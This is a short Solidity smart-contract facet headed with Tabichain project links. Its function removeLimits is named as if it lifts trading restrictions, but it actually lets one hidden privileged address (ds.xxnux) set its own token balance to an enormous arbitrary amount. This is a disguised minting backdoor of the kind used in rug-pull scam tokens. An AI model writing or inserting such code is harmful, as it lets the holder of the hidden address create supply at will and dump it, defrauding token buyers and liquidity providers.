/*  
   * SPDX-License-Identifier: MIT 

     // Telegram: https://t.me/Tabichain
    // Github: https://github.com/treasureland-market
    // Twitter: https://twitter.com/Tabichain
    // Website: https://www.tabichain.com/
    // Discord: https://discord.com/invite/Tabichain
    // Medium:  https://tabi-official.medium.com/
    

*/
pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
